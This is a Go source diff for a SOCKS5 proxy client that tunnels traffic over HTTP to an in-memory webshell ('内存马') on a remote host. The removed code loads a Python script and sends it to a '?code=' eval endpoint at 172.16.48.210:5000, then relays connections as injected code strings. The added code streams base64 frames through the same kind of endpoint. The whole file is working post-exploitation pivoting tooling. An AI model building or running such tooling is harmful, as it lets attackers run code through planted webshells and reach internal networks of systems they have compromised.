@@ -1,196 +1,282 @@
 package main
 
 import (
-	"crypto/rand"
+	"bufio"
 	"encoding/base64"
-	"encoding/hex"
-	"errors"
+	"flag"
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"net/http"
-	"os"
 	"strings"
+	"sync"
+	"time"
 )
 
-var ServerAddr = "http://172.16.48.210:5000"
+const (
+	socksVersion5 = 0x05
 
-type PySocket struct {
-	addr     net.Addr
-	id       string
+	authNoAcceptable = 0xFF
+	authNoAuth       = 0x00
+
+	cmdConnect = 0x01
+
+	atypIPv4   = 0x01
+	atypDomain = 0x03
+	atypIPv6   = 0x04
+
+	repSuccess              = 0x00
+	repGeneralFailure       = 0x01
+	repConnectionNotAllowed = 0x02
+	repNetworkUnreachable   = 0x03
+	repHostUnreachable      = 0x04
+	repConnectionRefused    = 0x05
+	repTTLExpired           = 0x06
+	repCommandNotSupported  = 0x07
+	repAddrTypeNotSupported = 0x08
+)
+
+type data struct {
+	streamId int64
+	data     []byte
+}
+
+type connect struct {
+	streamId int64
 	conn     net.Conn
-	done     chan struct{}
-	respChan chan *http.Response
 }
 
-func NewPySocket(c net.Conn) *PySocket {
-	var r [16]byte
-	rand.Read(r[:])
-	s := &PySocket{
-		addr:     c.RemoteAddr(),
-		id:       "_" + hex.EncodeToString(r[:]),
-		conn:     c,
-		done:     make(chan struct{}),
-		respChan: make(chan *http.Response, 16),
+type Server struct {
+	// 连接管理
+	connects   map[int64]connect
+	connMu     sync.RWMutex
+	listenConn net.Listener //本地监听端口
+
+	// 对端内存马管理
+	sendChan chan data
+	recvChan chan data
+
+	// 其他必要的字段
+	Done chan struct{}
+}
+
+func NewServer(listenAddr string) (*Server, error) {
+	listener, err := net.Listen("tcp", listenAddr)
+	if err != nil {
+		return nil, fmt.Errorf("监听失败 %s: %w", listenAddr, err)
 	}
-	return s
+
+	return &Server{
+		connects:   make(map[int64]connect),
+		listenConn: listener,
+		sendChan:   make(chan data, 100),
+		recvChan:   make(chan data, 100),
+		Done:       make(chan struct{}),
+	}, nil
 }
 
-func (p *PySocket) Close() error {
-	close(p.done)
-	return p.conn.Close()
+func encodeFrame(streamId int64, payload []byte) string {
+	b64 := base64.StdEncoding.EncodeToString(payload)
+	return fmt.Sprintf("%d:%s", streamId, b64)
+}
+
+func decodeFrame(line string) (int64, []byte, error) {
+	parts := strings.SplitN(strings.TrimSpace(line), ":", 2)
+	if len(parts) != 2 {
+		return 0, nil, fmt.Errorf("invalid frame")
+	}
+
+	var streamId int64
+	if _, err := fmt.Sscanf(parts[0], "%d", &streamId); err != nil {
+		return 0, nil, fmt.Errorf("invalid stream id: %w", err)
+	}
+
+	body, err := base64.StdEncoding.DecodeString(parts[1])
+	if err != nil {
+		return 0, nil, fmt.Errorf("invalid base64 payload: %w", err)
+	}
+
+	return streamId, body, nil
+}
+
+func (s *Server) setConn(c connect) {
+	s.connMu.Lock()
+	defer s.connMu.Unlock()
+	s.connects[c.streamId] = c
+}
+
+func (s *Server) getConn(streamId int64) (connect, bool) {
+	s.connMu.RLock()
+	defer s.connMu.RUnlock()
+	c, ok := s.connects[streamId]
+	return c, ok
+}
+
+func (s *Server) removeConn(streamId int64) {
+	s.connMu.Lock()
+	defer s.connMu.Unlock()
+	delete(s.connects, streamId)
+}
+
+// 上传隧道，发送数据包到服务器
+func (s *Server) startUpLoad(url string) (net.Conn, error) {
+	pr, pw := io.Pipe()
+	go func() {
+		defer pw.Close()
+		for {
+			select {
+			case d := <-s.sendChan:
+				line := encodeFrame(d.streamId, d.data) + "\n"
+				if _, err := pw.Write([]byte(line)); err != nil {
+					log.Printf("upload 写入失败: %v", err)
+					return
+				}
+			case <-s.Done:
+				return
+			}
+		}
+	}()
+
+	req, err := http.NewRequest("POST", url, pr)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Content-Type", "text/plain")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("请求失败:", err)
+		return nil, err
+	}
+	go func() {
+		defer resp.Body.Close()
+		_, _ = io.Copy(io.Discard, resp.Body)
+	}()
+	return nil, nil
+}
+
+// 下载隧道，从服务器接收数据包
+func (s *Server) startDownload(url string) {
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Println("请求失败:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	scanner := bufio.NewScanner(resp.Body)
+	scanner.Buffer(make([]byte, 0, 64*1024), 2*1024*1024)
+
+	for {
+		select {
+		case <-s.Done:
+			resp.Body.Close()
+			return
+		default:
+			if !scanner.Scan() {
+				if err := scanner.Err(); err != nil {
+					log.Printf("下载流读取出错: %v", err)
+					panic(err)
+				}
+				return
+			}
+
+			line := strings.TrimSpace(scanner.Text())
+			if line == "" {
+				continue
+			}
+
+			streamId, body, err := decodeFrame(line)
+			if err != nil {
+				log.Printf("解析帧失败: %v, 原文: %q", err, line)
+				continue
+			}
+
+			s.recvChan <- data{streamId: streamId, data: body}
+		}
+	}
+}
+
+func (s *Server) distributeData() {
+	for {
+		d := <-s.recvChan
+		c, ok := s.getConn(d.streamId)
+		if !ok {
+			continue
+		}
+		if _, err := c.conn.Write(d.data); err != nil {
+			log.Printf("回写本地连接失败 stream=%d: %v", d.streamId, err)
+			_ = c.conn.Close()
+			s.removeConn(d.streamId)
+		}
+	}
+}
+
+// func (s *Server) testWrite() {
+// 	for {
+// 		time.Sleep(time.Second)
+// 		s.sendChan <- data{streamId: 0, data: []byte("Hello from client!")}
+// 	}
+// }
+
+func (s *Server) Start(dialTimeout time.Duration) {
+	go s.startUpLoad("http://127.0.0.1:5000/receive")
+
+	go s.startDownload("http://127.0.0.1:5000/send")
+	go s.distributeData()
+
+	log.Printf("SOCKS5 代理服务器已启动，监听 %s", s.listenConn.Addr())
+
+	for {
+		clientConn, err := s.listenConn.Accept()
+		if err != nil {
+			log.Printf("接受连接失败: %v", err)
+			continue
+		}
+		streamId := rand.Int63()
+		s.setConn(connect{streamId: streamId, conn: clientConn})
+
+		go s.handleClient(streamId, dialTimeout)
+	}
 }
 
 func main() {
-	l, err := net.Listen("tcp", "127.0.0.1:2345")
+	listenAddr := flag.String("listen", ":1080", "SOCKS5 监听地址")
+	dialTimeout := flag.Duration("dial-timeout", 5*time.Second, "连接目标超时时间")
+	flag.Parse()
+
+	server, err := NewServer(*listenAddr)
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatalf("创建服务器失败: %v", err)
 	}
-	Init()
+	server.Start(*dialTimeout)
+}
 
-	in := make(chan *PySocket, 16)
+func (s *Server) handleClient(id int64, dialTimeout time.Duration) {
+	c, ok := s.getConn(id)
+	if !ok {
+		return
+	}
+	defer c.conn.Close()
+	defer s.removeConn(id)
 
-	go handler(in)
-
+	buf := make([]byte, 32*1024)
 	for {
-		conn, err := l.Accept()
+		n, err := c.conn.Read(buf)
+		if n > 0 {
+			payload := make([]byte, n)
+			copy(payload, buf[:n])
+			s.sendChan <- data{streamId: id, data: payload}
+		}
 		if err != nil {
-			log.Fatalln(err)
-			l.Close()
-			return
-		}
-		py := NewPySocket(conn)
-		in <- py
-	}
-}
-
-func eval(code string) (resp *http.Response, err error) {
-	res, err := http.Get(fmt.Sprintf("%s?code=%s", ServerAddr, code))
-	if err != nil {
-		log.Println("http request error:", err)
-		return res, err
-	}
-	return res, nil
-}
-
-func Init() {
-	response, err := eval(encode())
-	if err != nil {
-		log.Fatalln("init error:", err)
-	}
-	response.Body.Close()
-}
-
-func encode() string {
-	readfile := "proxy.py"
-	content, _ := os.ReadFile(readfile)
-	encoded := strings.ReplaceAll(string(content), "\r\n", "\n")
-	encoded = strings.ReplaceAll(encoded, "\n", "\\n")
-	encoded = strings.ReplaceAll(encoded, "\"", "\\\"")
-	fmt.Println(encoded)
-	return encoded
-}
-
-func handler(in chan *PySocket) {
-	for {
-		select {
-		case py, ok := <-in:
-			if !ok {
-				return // 通道已关闭，退出函数
+			if err != io.EOF {
+				log.Printf("读取本地连接失败 stream=%d: %v", id, err)
 			}
-			go py.Read()
-			go py.Write()
-		}
-	}
-}
-
-func (p *PySocket) Write() {
-	buf := make([]byte, 4096)
-	defer p.Close()
-	defer close(p.done)
-	for {
-		n, err := p.conn.Read(buf)
-		if err != nil {
-			if errors.Is(err, io.EOF) {
-				log.Println("connection closed by remote")
-				return
-			} else {
-				log.Println("read error:", err)
-				return
-			}
-		}
-		data := buf[:n]
-		host, port := Parser(data)
-		code := fmt.Sprintf("connect(%s,%s,%d,%s)", p.id, host, port, base64.StdEncoding.EncodeToString(data))
-		resp, err := http.Get(fmt.Sprintf("%s?code=%s", ServerAddr, code))
-		if err != nil {
-			log.Println("http request error:", err)
-			continue
-		}
-		p.respChan <- resp
-	}
-}
-
-// Parser return Host and Port from data
-func Parser(data []byte) (string, int) {
-	if len(data) < 10 || data[0] != 0x05 {
-		return "", 0 // 不是SOCKS5协议
-	}
-
-	if data[1] != 0x01 { // CMD不是CONNECT
-		return "", 0
-	}
-
-	atyp := data[3]
-	var addr string
-	var portStart int
-
-	switch atyp {
-	case 0x01: // IPv4
-		if len(data) < 10 {
-			return "", 0
-		}
-		addr = fmt.Sprintf("%d.%d.%d.%d", data[4], data[5], data[6], data[7])
-		portStart = 8
-	case 0x03: // 域名
-		addrLen := int(data[4])
-		if len(data) < 5+addrLen+2 {
-			return "", 0
-		}
-		addr = string(data[5 : 5+addrLen])
-		portStart = 5 + addrLen
-	case 0x04: // IPv6
-		return "", 0 // 简化处理，先不支持IPv6
-	default:
-		return "", 0
-	}
-
-	port := int(data[portStart])<<8 | int(data[portStart+1])
-	return addr, port
-}
-
-func (p *PySocket) Read() {
-	for {
-		select {
-		case resp := <-p.respChan:
-			data, err := io.ReadAll(resp.Body)
-			if err != nil {
-				log.Println("read response body error:", err)
-				continue
-			}
-			decoded, err := base64.StdEncoding.DecodeString(string(data))
-			if err != nil {
-				log.Println("base64 decode error:", err)
-				continue
-			}
-			_, err = p.conn.Write(decoded)
-			if err != nil {
-				log.Println("write to conn error:", err)
-				continue
-			}
-		case <-p.done:
 			return
 		}
 	}
+
 }
